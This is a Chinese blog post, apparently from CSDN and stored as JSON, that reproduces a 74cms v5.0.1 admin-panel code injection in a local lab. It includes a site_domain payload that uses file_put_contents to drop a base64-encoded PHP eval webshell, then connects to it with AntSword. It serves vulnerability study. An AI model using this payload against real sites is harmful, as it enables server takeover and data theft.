{"blogid": "124513778", "writerAge": "码龄3年", "writerBlogNum": "10", "writerCollect": "49", "writerComment": "3", "writerFan": "360", "writerGrade": "2级", "writerIntegral": "213", "writerName": "P_lang", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124513778.jpg", "writerRankTotal": "85500", "writerRankWeekly": "45210", "writerThumb": "16", "writerVisitNum": "11882", "blog_read_count": "1795", "blog_time": "于 2022-04-30 17:19:39 发布", "blog_title": "74cms v5.0.1 漏洞复现", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"_0\"></a>一、环境搭建</h2>\n<p>这里用到PHPstudy+VMware+Windows7（IP：192.168.253.131）进行环境搭建，且是在本地进行测试。<br/> 1.首先在官网下载74cms v5.0.1版本的安装包：http://www.74cms.com/download/index.html<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\8b0587d3a17e4189a291bb1424086fa1.png\"/><br/> 2.将下载好的压缩包文件解压并放至PHPstudy的WWW目录下。<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\297642959c084f0e8c54ebb599b7c2fa.png\"/><br/> 3.打开 192.168.253.131/74cms_Home_Setup_v5.0.1/upload/install.php 并系统安装。<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\eda875c0b8c745caa697b289c578c713.png\"/><br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\fd9ffe67a19d4b9aac5496fcecd0608c.png\"/><br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\a036f353dd9341da94a622d5ba9f6e0d.png\"/><br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\15a42517947147b9b8dc120566c3bf8a.png\"/></p>\n<p>OK，系统安装完成。</p>\n<h2><a id=\"_14\"></a>二、漏洞利用</h2>\n<p>1.登录后台以后，点击保存网站配置的同时用burpsuite抓包。<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\d0943d3ff81f4d88af72ec15fe1f1d75.png\"/><br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\326916cb6e47406b8c8a5be5ccbf77ad.png\"/><br/> 2.修改site_domain的内容，这里对内容进行base64加密：site_domain=‘,file_put_contents(‘403.php’,base64_decode(‘PD9waHAgZXZhbCgmX1BPU1QoJzEyMycpKTs/Pg==’)),’<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\33593068357641dbb8b5fc6f5887d467.png\"/><br/> 3.这里等号需要URL编码</p>\n<p><img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\37580a15b6f74dfa83d66fa70dacfaf3.png\"/><br/> 4.再次访问：http://192.168.253.131/74cms_Home_Setup_v5.0.1/upload/Application/Common/Conf/url.php，使恶意语句成功执行。<br/> <img alt=\"请添加图片描述\" src=\"..\\..\\static\\image\\56396f27f1b34754a8b4904280a67b96.png\"/><br/> 5.一句话木马已被写入：<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cf2d459995f24e16bca6a951725eadce.png\"/></p>\n<p>6.使用蚁剑连接：http://192.168.253.131/74cms_Home_Setup_v5.0.1/upload/Application/Common/Conf/403.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d1df7e3cc1034751a26bf51e5f597dd1.png\"/><br/> OK，连接成功，over。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-04-30 17:19:39", "summary": "一、环境搭建这里用到：进行环境搭建，且是在本地进行测试。首先在官网下载版本的安装包：请添加图片描述将下载好的压缩包文件解压并放至的目录下。请添加图片描述打开并系统安装。请添加图片描述请添加图片描述请添"}